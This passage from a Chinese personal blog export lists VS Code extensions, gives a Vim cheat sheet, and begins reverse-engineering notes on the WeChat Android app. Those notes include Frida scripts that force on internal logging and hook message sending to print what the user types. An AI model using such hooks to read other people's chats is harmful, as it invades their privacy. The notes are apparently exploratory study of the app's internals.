<td style="text-align:center">自动重命名成对的标签</td>
<td style="text-align:center">Auto Rename Tag</td>
</tr>
<tr>
<td style="text-align:center">智能提示CSS类名以及id</td>
<td style="text-align:center">HTML CSS Support</td>
</tr>
<tr>
<td style="text-align:center">智能提示HTML标签，以及标签含义</td>
<td style="text-align:center">HTML Snippets</td>
</tr>
<tr>
<td style="text-align:center">在浏览器快速打开html文件</td>
<td style="text-align:center">open in browser</td>
</tr>
<tr>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
</tr>
<tr>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
</tr>
<tr>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
</tr>
<tr>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
</tr>
</tbody>
</table>
<h3 id="Java-script">Java script<a class="header-anchor" href="#Java-script"> ¶ </a></h3>
<table>
<thead>
<tr>
<th style="text-align:center">功能</th>
<th style="text-align:center">插件名称</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">代码片段插件</td>
<td style="text-align:center">JavaScript (ES6) code snippets</td>
</tr>
<tr>
<td style="text-align:center">代码格式化</td>
<td style="text-align:center">Beautify</td>
</tr>
<tr>
<td style="text-align:center">浏览器调试</td>
<td style="text-align:center">Debugger for Chrome</td>
</tr>
<tr>
<td style="text-align:center"><strong>代码格式化</strong></td>
<td style="text-align:center">Prettier - Code formatter</td>
</tr>
<tr>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
</tr>
<tr>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
</tr>
<tr>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
</tr>
<tr>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
</tr>
<tr>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
</tr>
</tbody>
</table>
<h4 id="Auto-js">Auto.js<a class="header-anchor" href="#Auto-js"> ¶ </a></h4>
<p>Auto.js-VSCodeExt</p>
<h3 id="Python">Python<a class="header-anchor" href="#Python"> ¶ </a></h3>
<table>
<thead>
<tr>
<th style="text-align:center">功能</th>
<th style="text-align:center">插件名称</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">python环境必备</td>
<td style="text-align:center">Python</td>
</tr>
<tr>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
</tr>
<tr>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
</tr>
<tr>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
</tr>
<tr>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
</tr>
<tr>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
</tr>
<tr>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
</tr>
<tr>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
</tr>
<tr>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
</tr>
</tbody>
</table>
<p>flake8是python发一个静态代码选择工具，用来检测python书写是否规范；yapf是python代码格式化的工具。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python -m pip install flake8</span><br><span class="line">python -m pip install yapf</span><br></pre></td></tr></table></figure>
<h2 id="未归类">未归类<a class="header-anchor" href="#未归类"> ¶ </a></h2>
<p>3.1 Auto Close Tag (自动闭合HTML/XML标签)<br>
3.2 Auto Rename Tag (自动完成另一侧标签的同步修改)<br>
3.3 Beautify (格式化 html ,js,css)<br>
3.4 Bracket Pair Colorizer(给括号加上不同的颜色，便于区分不同的区块)<br>
3.5 Debugger for Chrome(映射vscode上的断点到chrome上，方便调试)<br>
3.6 ESLint(js语法纠错，可以自定义配置)<br>
3.7 GitLens(方便查看git日志)<br>
3.8 HTML CSS Support (智能提示CSS类名以及id)<br>
3.9 HTML Snippets(智能提示HTML标签，以及标签含义)<br>
3.10 JavaScript(ES6) code snippets(ES6语法智能提示，以及快速输入)<br>
3.11 jQuery Code Snippets(jQuery代码智能提示)<br>
3.12 Markdown Preview Enhanced(实时预览markdown)<br>
3.13 markdownlint(markdown语法纠错)<br>
3.14 Material Icon Theme(vscode图标主题)<br>
3.15 Icon fonts(图标字体)<br>
3.16 open in browser(右键快速在浏览器中打开html文件)<br>
3.17 Path Intellisense(自动提示文件路径)<br>
3.18 React/Redux/react-router Snippets(React/Redux/react-router语法智能提示)<br>
3.19 Vetur(Vue多功能集成插件，错误提示等)<br>
3.20 Class autocomplete for HTML(智能提示HTML class =“”属性)<br>
3.21 npm Intellisense(require 时的包提示)<br>
3.22 vscode-icons 好看的图标插件<br>
3.23 PHP Debug 配合php扩展Xdebug使用<br>
3.24 Bracket Pair Colorrizer 用来区分括号<br>
3.25 PHP DocBlocker 用于函数,类的快速注释<br>
3.26 PHP Intelephense PHP智能感知<br>
3.27 PHP Intellisense PHP智能感知，两个都下<br>
3.28 Path Intellisense 路径感知<br>
3.29 PHP Namespace Resolver Namespace的快速引入, 选中类,按ctrl+alt+I<br>
3.30 TODO Hightlight 高亮关键词 TODO: FIXME:<br>
3.31 Settings Sync 同步扩展配置用的(通过github帐号)</p>
<p>Live Server  写html自动刷新网页</p>
]]></content>
      <categories>
        <category>工具&amp;环境调教</category>
      </categories>
      <tags>
        <tag>工具&amp;环境调教</tag>
      </tags>
  </entry>
  <entry>
    <title>【工具调教】Vim使用速查</title>
    <url>/Env/Vim_usage_quick_check/</url>
    <content><![CDATA[<h1 id="Vim速查">Vim速查<a class="header-anchor" href="#Vim速查"> ¶ </a></h1>
<h2 id="插入模式">插入模式<a class="header-anchor" href="#插入模式"> ¶ </a></h2>
<table>
<thead>
<tr>
<th style="text-align:center">字母</th>
<th style="text-align:center">含义</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center"><code>a</code></td>
<td style="text-align:center">在当前字符<strong>后</strong>插入</td>
</tr>
<tr>
<td style="text-align:center"><code>i</code></td>
<td style="text-align:center">在当前字符<strong>前</strong>插入</td>
</tr>
<tr>
<td style="text-align:center"><code>o</code></td>
<td style="text-align:center">插入新行到后</td>
</tr>
<tr>
<td style="text-align:center"><code>A</code></td>
<td style="text-align:center">在当前行后插入</td>
</tr>
<tr>
<td style="text-align:center"><code>I</code></td>
<td style="text-align:center">在当前行前插入</td>
</tr>
<tr>
<td style="text-align:center"><code>O</code></td>
<td style="text-align:center">插入新行到前</td>
</tr>
</tbody>
</table>
<ul>
<li><code>ctrl h</code> 删除上一个字符</li>
<li><code>ctrl w</code> 删除上一个单词</li>
<li><code>ctrl u</code> 删除当前一行</li>
<li><code>ctrl [</code> 退出编辑模式进入normal模式（代替Esc）</li>
<li><code>gi</code> 快速回到最后一次编辑位置</li>
<li>题外话：linux命令行快捷键：
<ul>
<li>ctrl a 移动到当前行开头</li>
<li>ctrl e 移动到当前行结尾</li>
<li>ctrl b 向前移一位</li>
<li>ctrl f 向后移一位</li>
</ul>
</li>
</ul>
<h2 id="normal模式">normal模式<a class="header-anchor" href="#normal模式"> ¶ </a></h2>
<h3 id="快速移动">快速移动<a class="header-anchor" href="#快速移动"> ¶ </a></h3>
<ul>
<li><code>h</code>（左），<code>j</code>（下），<code>k</code>（上），<code>l</code>（右）</li>
<li>单词之间移动
<ul>
<li><code>w</code>/<code>W</code>移动到下一个word/WORD开头，<code>e</code>移动到尾部</li>
<li><code>b</code>/<code>B</code>移动到上一个word/WORD开头</li>
<li>word是以非空白符分割的单词，WORD是以空白符分割的单词</li>
</ul>
</li>
<li>行间搜索移动
<ul>
<li>使用<code>f&#123;char&#125;</code>移动到char字符上，用<code>t</code>移动到char的前一个字符</li>
<li>可以用分号<code>;</code>/逗号<code>,</code>继续搜下一个/上一个</li>
<li><code>F</code>倒着搜</li>
</ul>
</li>
<li>vim水平移动
<ul>
<li><code>0</code>移动到行首第一个字符，<code>^</code>移动到第一个非空白字符</li>
<li><code>＄</code>移动到行尾，<code>g_</code>移动到行尾非空白字符</li>
</ul>
</li>
<li>vim垂直移动
<ul>
<li>使用<code>()</code>在句子间移动</li>
<li>使用<code>&#123;&#125;</code>在段落间移动</li>
</ul>
</li>
<li>vim页面移动
<ul>
<li><code>gg</code>/<code>G</code>移动到文件的开头/结尾，<code>Ctrl o</code>快速返回</li>
<li><code>H</code>/<code>M</code>/<code>L</code> 移动到屏幕开头/中间/结尾</li>
<li><code>ctrl u</code>/<code>ctrl f</code> 上下翻页，<code>zz</code>将当前行放在屏幕中间</li>
</ul>
</li>
</ul>
<h3 id="增删改查">增删改查<a class="header-anchor" href="#增删改查"> ¶ </a></h3>
<ul>
<li>快速删除
<ul>
<li><code>x</code> 快速删除一个字符
<ul>
<li>删除2个字符 <code>2x</code></li>
</ul>
</li>
<li><code>daw</code> 快速删除一个单词，包含周围空格</li>
<li><code>diw</code> 快速删除一个单词，不包含周围空格</li>
<li><code>dd</code> 删除当前行
<ul>
<li>删除2行 <code>2dd</code></li>
</ul>
</li>
<li><code>dt[R]</code> 从当前删除到<code>[R]</code>字符前</li>
</ul>
</li>
<li>快速修改
<ul>
<li><code>r[R]</code> 将当前光标字符替换成字符<code>[R]</code></li>
<li><code>R[S]</code> 会将其后的字符挨个替换成字符串<code>[S]</code></li>
<li><code>c</code> 删除并进入插入模式
<ul>
<li>同上述的<code>d</code>：<code>caw</code> <code>ciw</code> <code>ct[R]</code></li>
</ul>
</li>
<li><code>C</code> 删除当前光标后整行并进入插入模式</li>
<li><code>s</code> 删除当前光标字符并进入插入模式
<ul>
<li>删除<code>[\d]</code>个字符并…  <code>[\d]s</code></li>
</ul>
</li>
<li><code>S</code> 删除整行并进入插入模式</li>
</ul>
</li>
<li>查询
<ul>
<li><code>/</code> / <code>?</code> 前向搜索、反向搜索</li>
<li><code>n</code>/<code>N</code> 跳转到下一个、上一个匹配</li>
<li><code>*</code>/<code>#</code> 当前单词的前向、后向匹配</li>
</ul>
</li>
</ul>
<h2 id="Visual-可视-模式">Visual(可视)模式<a class="header-anchor" href="#Visual-可视-模式"> ¶ </a></h2>
<ul>
<li>Normal模式下用<code>v</code>进入visual选择</li>
<li>使用<code>V</code>选择行</li>
<li>使用<code>ctrl v</code>进行方块选择</li>
</ul>
<p>选择后可以用<code>d</code>剪贴，或则<code>y</code>复制</p>
<h2 id="命令模式">命令模式<a class="header-anchor" href="#命令模式"> ¶ </a></h2>
<h3 id="substitute替换命令">substitute替换命令<a class="header-anchor" href="#substitute替换命令"> ¶ </a></h3>
<ul>
<li>命令格式 <code>:[range] s[ubstitute]/&#123;pattern&#125;/&#123;string&#125;/[flags]</code>
<ul>
<li><code>[range]</code> 表示范围：<code>10,20</code>表示10-20行，<code>%</code>表示全部</li>
<li><code>[pattern]</code> 想要替换的字符串</li>
<li><code>[string]</code> 替换后文本</li>
<li><code>[flags]</code> 替换的标志
<ul>
<li><code>g</code> 全局范围内执行</li>
<li><code>c</code> 表示确认，可以确认或者拒绝修改</li>
<li><code>n</code> 报告匹配次数 不替换，用来<strong>查询匹配次数</strong></li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="命令行执行normal命令">命令行执行normal命令<a class="header-anchor" href="#命令行执行normal命令"> ¶ </a></h3>
<p>格式</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">:normal &lt;<span class="built_in">command</span>&gt;</span><br></pre></td></tr></table></figure>
<p>用途：使用<code>V</code>选中多行，然后<code>:normal I&quot;</code>在每行前面添加<code>&quot;</code></p>
<h2 id="多文件切换">多文件切换<a class="header-anchor" href="#多文件切换"> ¶ </a></h2>
<ul>
<li>打开多文件 <code>:e &#123;FileName&#125;</code></li>
<li>Buffer缓冲区切换
<ul>
<li><code>:ls</code> 列举当前缓冲区</li>
<li><code>:b [num]</code> 跳转到第<code>[num]</code>个缓冲区
<ul>
<li><code>:bpre</code> <code>:bnext</code> <code>:bfirst</code> <code>:blast</code></li>
<li><code>:b [BufferName]</code> + Tab补全</li>
</ul>
</li>
</ul>
</li>
<li>窗口
<ul>
<li>水平分割窗口：<code>&lt;Ctrl w&gt; s</code>  <code>:sp &#123;FileName&#125;</code> 水平分割并打开新窗口</li>
<li>垂直分割窗口：<code>&lt;Ctrl w&gt; v</code>  <code>:vs</code></li>
<li>切换窗口
<ul>
<li><code>&lt;Ctrl w&gt; w</code>  循环切换窗口</li>
<li><code>&lt;Ctrl w&gt; h</code>  切换到左边窗口</li>
<li><code>&lt;Ctrl w&gt; j</code>  切换到下边窗口</li>
<li><code>&lt;Ctrl w&gt; k</code>  切换到上边窗口</li>
<li><code>&lt;Ctrl w&gt; l</code> 切换到下边窗口</li>
</ul>
</li>
<li>移动窗口
<ul>
<li><code>&lt;Ctrl w&gt; H</code>  将当前窗口移动到左边 ，JKL同理</li>
</ul>
</li>
<li>重排窗口
<ul>
<li><code>&lt;Ctrl w&gt; =</code> 使所有窗口等宽等高</li>
<li><code>&lt;Ctrl w&gt; _</code>  最大化活动窗口的高度：<code>[num]&lt;Ctrl w&gt; _</code> 将高度设为<code>[num]</code>行</li>
<li><code>&lt;Ctrl w&gt; |</code>  最大化活动窗口的宽度</li>
</ul>
</li>
</ul>
</li>
<li>Tab(标签页)操作
<ul>
<li><code>tabe[dit] &#123;FileName&#125;</code>  在新标签页打开文件</li>
<li><code>&lt;Ctrl w&gt; T</code>  将当前窗口移动到新标签页</li>
<li><code>tabc[lose]</code> 关闭当前标签页及所有窗口</li>
<li><code>tabo[nly]</code> 保留当前标签页，关闭其他所有标签页</li>
<li><code>tabn[ext]&#123;N&#125;</code> <code>&#123;N&#125;gt</code> 切换到编号为N的标签页</li>
<li><code>tabn[ext]</code> <code>gt</code> 切换到下一个标签页</li>
<li><code>tabp[revious] </code> <code>gT</code> 切换到上一个标签页</li>
</ul>
</li>
</ul>
<h2 id="Vim文本对象">Vim文本对象<a class="header-anchor" href="#Vim文本对象"> ¶ </a></h2>
<ul>
<li><code>[number]&lt;command&gt;[text object]</code> ：格式
<ul>
<li><code>[number]</code> 表示操作次数</li>
<li><code>&lt;command&gt;</code> 命令：<code>d</code>删除，<code>c</code>改变，<code>y</code>复制</li>
<li><code>[text object]</code> 表示要操作的文本对象</li>
</ul>
</li>
<li>文本对象
<ul>
<li><code>iw</code> 当前单词</li>
<li><code>aw</code> 当前单词与当前单词之后的空格</li>
<li><code>is</code> 当前句子，<code>as</code> 同</li>
<li><code>ip</code> 当前段落</li>
<li><code>i +[ ]</code>
<ul>
<li><code>i(</code> 小括号内内容，不包括小括号</li>
<li><code>a(</code> 小括号及小括号内容</li>
<li>类似还有 <code>[]</code> <code>&#123;&#125;</code> <code>&lt;&gt;</code> <code>&quot;&quot;</code> <code>''</code></li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="Vim复制粘贴">Vim复制粘贴<a class="header-anchor" href="#Vim复制粘贴"> ¶ </a></h2>
<ul>
<li>
<p>normal模式下复制粘贴</p>
<ul>
<li>
<p><code>y(yank)</code> 复制</p>
</li>
<li>
<p><code>d</code> 剪贴</p>
</li>
<li>
<p><code>p(put)</code> 粘贴</p>
</li>
<li>
<p>用<code>v(visual)</code>选中要复制的地方，再用d y p</p>
</li>
<li>
<p>配合文本对象</p>
</li>
</ul>
</li>
<li>
<p>insert模式下复制粘贴</p>
</li>
<li>
<p>粘贴代码格式混乱解决办法</p>
<ul>
<li>当设置了<code>autoindent</code>(自动缩进)后，粘贴代码缩进可能会错乱</li>
<li>解决办法：
<ul>
<li>粘贴前使用命令： <code>:set paste</code></li>
<li>粘贴后撤销上一条命令： <code>:set nopaste</code></li>
</ul>
</li>
</ul>
</li>
<li>
<p>寄存器</p>
<ul>
<li>
<p>Vim操作的是vim寄存器，而不是系统剪贴板</p>
</li>
<li>
<p>指定寄存器</p>
<ul>
<li>
<p>使用<code>&quot;&#123;register&#125;</code> 作为前缀 执行 复制剪贴粘贴 命令时，可以指定寄存器</p>
</li>
<li>
<p>不指定默认使用无名寄存器  无名寄存器指定为<code>&quot;&quot;</code>两个双引号</p>
</li>
<li>
<p>示例</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;add	# 剪贴该行至a寄存器</span></span><br><span class="line"><span class="string">&quot;</span>byy	<span class="comment"># 复制该行至b寄存器</span></span><br><span class="line"><span class="string">&quot;ap		# 粘贴a寄存器内容</span></span><br></pre></td></tr></table></figure>
</li>
<li>
<p>常见寄存器</p>
<table>
<thead>
<tr>
<th style="text-align:center">寄存器符号</th>
<th style="text-align:center">含义</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center"><code>a-z</code></td>
<td style="text-align:center">有名寄存器</td>
</tr>
<tr>
<td style="text-align:center"><code>&quot;0</code></td>
<td style="text-align:center">复制专用寄存器</td>
</tr>
<tr>
<td style="text-align:center"><code>&quot;+</code></td>
<td style="text-align:center">复制到系统剪贴板</td>
</tr>
<tr>
<td style="text-align:center"><code>%</code></td>
<td style="text-align:center">当前文件名</td>
</tr>
<tr>
<td style="text-align:center"><code>&quot;.</code></td>
<td style="text-align:center">上次插入文本</td>
</tr>
</tbody>
</table>
</li>
<li>
<p>将系统剪贴板与无名寄存器关联</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">set</span> clipboard=unnamed</span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="Vim宏">Vim宏<a class="header-anchor" href="#Vim宏"> ¶ </a></h2>
<p>宏的使用分为 录制 和 回放</p>
<ul>
<li>录制：
<ul>
<li>使用<code>q&#123;reg&#125;</code>来录制，同时使用<code>q</code>来结束录制</li>
<li>使用<code>q&#123;register&#125;</code>选择要保存的寄存器，把录制的命令保存到其中</li>
</ul>
</li>
<li>回放
<ul>
<li>使用<code>@&#123;rigister&#125;</code> 回放寄存器中保存的一系列命令</li>
</ul>
</li>
</ul>
<h2 id="Vim补全">Vim补全<a class="header-anchor" href="#Vim补全"> ¶ </a></h2>
<table>
<thead>
<tr>
<th style="text-align:center">命令</th>
<th style="text-align:center">补全类型</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center"><code>Ctrl n</code></td>
<td style="text-align:center"><strong>普通关键字补全</strong>(向下)</td>
</tr>
<tr>
<td style="text-align:center"><code>Ctrl p</code></td>
<td style="text-align:center"><strong>普通关键字补全</strong>(向上)</td>
</tr>
<tr>
<td style="text-align:center"><code>Ctrl x</code> <code>Ctrl f</code></td>
<td style="text-align:center"><strong>文件名补全</strong></td>
</tr>
<tr>
<td style="text-align:center"><code>Ctrl x</code> <code>Ctrl n</code></td>
<td style="text-align:center">当前缓冲区关键字</td>
</tr>
<tr>
<td style="text-align:center"><code>Ctrl x</code> <code>Ctrl i</code></td>
<td style="text-align:center">包含文件关键字</td>
</tr>
<tr>
<td style="text-align:center"><code>Ctrl x</code> <code>Ctrl ]</code></td>
<td style="text-align:center">标签文件关键字</td>
</tr>
<tr>
<td style="text-align:center"><code>Ctrl x</code> <code>Ctrl k</code></td>
<td style="text-align:center">字典查找</td>
</tr>
<tr>
<td style="text-align:center"><code>Ctrl x</code> <code>Ctrl l</code></td>
<td style="text-align:center">整行补全</td>
</tr>
<tr>
<td style="text-align:center"><code>Ctrl x</code> <code>Ctrl o</code></td>
<td style="text-align:center">全能(Omni)补全（可能需要安装插件）</td>
</tr>
</tbody>
</table>
<h1 id="Vim配置">Vim配置<a class="header-anchor" href="#Vim配置"> ¶ </a></h1>
<h2 id="vim配置">vim配置<a class="header-anchor" href="#vim配置"> ¶ </a></h2>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot; 主题</span></span><br><span class="line"><span class="string">color desert</span></span><br><span class="line"><span class="string">&quot;</span> 设置行号</span><br><span class="line"><span class="built_in">set</span> number</span><br><span class="line"><span class="string">&quot; 启用代码高亮</span></span><br><span class="line"><span class="string">syntax enable</span></span><br><span class="line"><span class="string">&quot;</span>高亮搜索</span><br><span class="line"><span class="built_in">set</span> hlsearch</span><br></pre></td></tr></table></figure>
<h2 id="Vim映射">Vim映射<a class="header-anchor" href="#Vim映射"> ¶ </a></h2>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot; 主题</span></span><br><span class="line"><span class="string">color desert</span></span><br><span class="line"><span class="string">&quot;</span> 设置行号</span><br><span class="line"><span class="built_in">set</span> number</span><br><span class="line"><span class="string">&quot; 启用代码高亮</span></span><br><span class="line"><span class="string">syntax enable</span></span><br><span class="line"><span class="string">&quot;</span>高亮搜索</span><br><span class="line"><span class="built_in">set</span> hlsearch</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">&quot; 修改映射</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;</span> insert模式 映射</span><br><span class="line"><span class="string">&quot; 修改 jj退出insert模式(替换Esc)</span></span><br><span class="line"><span class="string">inoremap jj &lt;Esc&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;</span> normal模式 映射</span><br><span class="line"><span class="string">&quot; 修改窗口切换按键</span></span><br><span class="line"><span class="string">noremap &lt;C-h&gt; &lt;C-w&gt;h</span></span><br><span class="line"><span class="string">noremap &lt;C-j&gt; &lt;C-w&gt;j</span></span><br><span class="line"><span class="string">noremap &lt;C-k&gt; &lt;C-w&gt;k</span></span><br><span class="line"><span class="string">noremap &lt;C-l&gt; &lt;C-w&gt;l</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;</span> <span class="built_in">command</span>命令行模式 映射</span><br><span class="line"><span class="string">&quot; com!</span></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>工具&amp;环境调教</category>
      </categories>
      <tags>
        <tag>工具&amp;环境调教</tag>
      </tags>
  </entry>
  <entry>
    <title>vx逆向分析随笔</title>
    <url>/AndroidReverse/2021/Analysis_of_WeChat/</url>
    <content><![CDATA[<h1 id="vx逆向分析随笔">vx逆向分析随笔<a class="header-anchor" href="#vx逆向分析随笔"> ¶ </a></h1>
<p>另外有Android逆向可以一起交流学习呀。<a class="btn-beautify " href="/./about" title="点击联系我"><i class="far fa-hand-point-right"></i><span>点击联系我</span></a>，一个人闷搞挺没劲的。</p>
<p>@app_version = 7.0.20</p>
<p>@app_date = 2020.11.19</p>
<p>本来是想分析vx8的，但是电脑性能不够……反编译工具直接卡死</p>
<h2 id="vx-Log日志">vx Log日志<a class="header-anchor" href="#vx-Log日志"> ¶ </a></h2>
<p>当进行分析时，发现反复调用了<code>ae.i</code>,<code>ae.d</code>方法</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/.io//image-20210814171654155.png" alt="image-20210814171654155"></p>
<p>来到<code>com.tencent.mm.sdk.platformtools.ae;</code>查看</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/.io//image-20210814171854620.png" alt="image-20210814171854620"></p>
<p>同时找到了<code>setConsoleLogOpen</code>方法，猜测这是对控制台log全局控制的方法</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/.io//image-20210814172452010.png" alt="image-20210814172452010"></p>
<p>对该方法向上追溯，得到</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">com.tencent.mm.sdk.platformtools.ae<span class="variable">$a</span>;setConsoleLogOpen</span><br><span class="line">com.tencent.mm.sdk.platformtools.ae;setConsoleLogOpen</span><br><span class="line">com.tencent.mm.xlog.app.XLogSetup;keep_setupXLog</span><br><span class="line">com.tencent.mm.xlog.app.XLogSetup;realSetupXlog</span><br><span class="line">com.tencent.mm.plugin.account.ui.SimpleLoginUI;onCreate/com.tencent.mm.ui.LauncherUI;onResume</span><br></pre></td></tr></table></figure>
<p>其中设置log的是keep_setupXLog的p5参数</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">keep_setupXLog</span><span class="params">(<span class="keyword">boolean</span> p0,String p1,String p2,Integer p3,Boolean p4,Boolean p5,String p6)</span></span>&#123;</span><br><span class="line">   <span class="comment">// ...</span></span><br><span class="line">   XLogSetup.cachePath = p1;	<span class="comment">// 缓存目录:/data/user/0/com.tencent.mm/files/xlog</span></span><br><span class="line">   XLogSetup.logPath = p2;		<span class="comment">// log目录:/storage/emulated/0/Android/data/com.tencent.mm/MicroMsg/xlog</span></span><br><span class="line">   XLogSetup.toolsLevel = p3;	<span class="comment">// 工具版本:null</span></span><br><span class="line">   XLogSetup.appendIsSync = p4;</span><br><span class="line">   XLogSetup.isLogcatOpen = p5;	<span class="comment">// 是否开启日志:false</span></span><br><span class="line">   XLogSetup.nameprefix = p6;	<span class="comment">// 前缀:MM</span></span><br><span class="line">   <span class="keyword">if</span> (!p0) &#123;	</span><br><span class="line">      <span class="comment">// ...</span></span><br><span class="line">   &#125;<span class="keyword">else</span> <span class="keyword">if</span>(XLogSetup.setup)&#123;		</span><br><span class="line">      <span class="comment">// ...</span></span><br><span class="line">   &#125;<span class="keyword">else</span> &#123;	</span><br><span class="line">      <span class="comment">// ...</span></span><br><span class="line">      ae.setConsoleLogOpen(XLogSetup.isLogcatOpen.booleanValue());</span><br><span class="line">      <span class="comment">// ...</span></span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>于是开启log只需要给<code>p5</code>赋值为<code>true</code></p>
<p>frida脚本</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">Java.perform(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    * 开启vx全局日志</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="keyword">var</span> clazz = Java.use(<span class="string">&#x27;com.tencent.mm.xlog.app.XLogSetup&#x27;</span>);</span><br><span class="line">    clazz.keep_setupXLog.overload(<span class="string">&#x27;boolean&#x27;</span>, <span class="string">&#x27;java.lang.String&#x27;</span>, <span class="string">&#x27;java.lang.String&#x27;</span>, <span class="string">&#x27;java.lang.Integer&#x27;</span>, <span class="string">&#x27;java.lang.Boolean&#x27;</span>, <span class="string">&#x27;java.lang.Boolean&#x27;</span>, <span class="string">&#x27;java.lang.String&#x27;</span>).implementation = <span class="function"><span class="keyword">function</span>(<span class="params">p0,p1,p2,p3,p4,p5,p6</span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//console.log(&quot;arguments&quot;,arguments[5]);</span></span><br><span class="line">        <span class="built_in">arguments</span>[<span class="number">5</span>] = Java.use(<span class="string">&quot;java.lang.Boolean&quot;</span>).TRUE.value;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&quot;已开启vx Log打印&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> clazz.keep_setupXLog.apply(<span class="built_in">this</span>, <span class="built_in">arguments</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<h2 id="vx发送消息">vx发送消息<a class="header-anchor" href="#vx发送消息"> ¶ </a></h2>
<p>使用<code>DDMS</code>的<code>Start Method Profiling</code>功能，同时点击【发送】键</p>
<p>然后停止记录，搜索<code>onClick</code>关键字，定位到类<code>com.tencent.mm.pluginsdk.ui.chat.ChatFooter$7</code></p>
<p>其中<code>sstr</code>为输入的字符串内容</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/.io//image-20210815161220040.png" alt="image-20210815161220040"></p>
<p>尝试hook <code>ChatFooter.a</code>方法</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">Java.perform(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> clazz = Java.use(<span class="string">&#x27;com.tencent.mm.pluginsdk.ui.chat.ChatFooter&#x27;</span>);</span><br><span class="line">    clazz.a.overload(<span class="string">&#x27;com.tencent.mm.pluginsdk.ui.chat.ChatFooter&#x27;</span>, <span class="string">&#x27;java.lang.String&#x27;</span>).implementation = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&quot;Send Message&quot;</span>,<span class="built_in">arguments</span>[<span class="number">1</span>]);</span><br><span class="line">        <span class="keyword">return</span> clazz.a.apply(<span class="built_in">this</span>, <span class="built_in">arguments</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<p>可以得到输出</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Send Message 1</span><br><span class="line">Send Message 2</span><br><span class="line">Send Message [微笑]</span><br><span class="line">Send Message 😂</span><br></pre></td></tr></table></figure>
<h2 id="vx聊天窗口-修改内容">vx聊天窗口/修改内容<a class="header-anchor" href="#vx聊天窗口-修改内容"> ¶ </a></h2>
<h3 id="定位">定位<a class="header-anchor" href="#定位"> ¶ </a></h3>
<p>使用<code>DDMS</code>的<code>Dump View Hierarchy for UI Automator</code>来定位控件ID</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/.io//image-20210815003423908.png" alt="image-20210815003423908"></p>
<p>查看顶层activity</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">adb shell dumpsys activity top</span><br></pre></td></tr></table></figure>
